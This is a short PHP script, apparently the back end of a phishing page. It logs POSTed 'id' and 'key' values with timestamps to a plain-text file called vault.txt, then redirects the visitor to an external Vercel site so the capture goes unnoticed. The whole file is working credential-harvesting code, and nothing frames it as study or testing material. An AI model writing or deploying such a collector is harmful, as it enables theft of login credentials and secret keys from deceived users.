<?php
$file = 'vault.txt';
// Menangkap 'id' dan 'key'
$data = "Time: " . date('Y-m-d H:i:s') . " | ID: " . $_POST['id'] . " | KEY: " . $_POST['key'] . "\n";
file_put_contents($file, $data, FILE_APPEND);
header("Location: https://prompt-koleksi.vercel.app/");
exit();
?>
